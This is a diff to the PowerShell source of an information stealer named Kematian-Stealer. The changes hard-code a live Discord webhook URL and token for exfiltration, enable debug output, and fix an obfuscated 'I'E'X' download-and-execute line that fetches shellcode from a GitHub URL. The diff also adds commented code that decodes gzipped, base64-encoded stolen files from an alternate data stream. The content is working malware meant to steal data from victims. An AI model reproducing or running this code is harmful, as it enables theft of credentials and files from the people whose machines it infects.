@@ -1,4 +1,4 @@
-$debug = $false
+$debug = $true
 
 if ($debug) {
     $ProgressPreference = 'Continue'
@@ -27,7 +27,7 @@ function KDMUTEX {
 
 Add-Type -AssemblyName PresentationCore, PresentationFramework
 
-$webhook = "YOUR_WEBHOOK_HERE"
+$webhook = "https://discord.com/api/webhooks/1236436488229490838/Goqy1od7Rs2P1WrYwT39nNN0Qs_nZyhGx8G5uGSW4jc4KxNAQGYStFHM-4O1Y8ONjLW0"
 $avatar = "https://i.imgur.com/DOIYOtp.gif"
 
 
@@ -894,9 +894,22 @@ function Backup-Data {
     Write-Host "[!] Injecting Shellcode !"
     $kematian_shellcode = ("https://github.com/Chainski/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$kematian_shellcode')"
-    $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru -RedirectStandardOutput $PSCommandPath:stdout
+    $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru -RedirectStandardOutput ($PSCommandPath + ":stdout")
     $proc.WaitForExit()
     Write-Host "[!] Shellcode Injection Completed !" -ForegroundColor Green
+
+    #$stdout = Get-Content ($PSCommandPath + ":stdout")
+    #$outArray = $stdout -split "`n"
+    ##for every line in outArray (line 1 = discord.json, line 2 = contents of discord.json base64 encoded gunzip)
+    #for ($i = 0; $i -lt $outArray.Length; $i += 2) {
+    #    $file = $outArray[$i]
+    #    Write-Host $file
+    #    $content = $outArray[$i + 1]
+    #    $content = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($content))
+    #    #ungzip the content
+    #    $content = [System.Text.Encoding]::UTF8.GetString([System.IO.Compression.GzipStream]::new([System.IO.MemoryStream]::new([System.Convert]::FromBase64String($content)), [System.IO.Compression.CompressionMode]::Decompress))
+    #    $content | Out-File $file -Force
+    #}
 
     $main_temp = "$env:localappdata\temp"
 
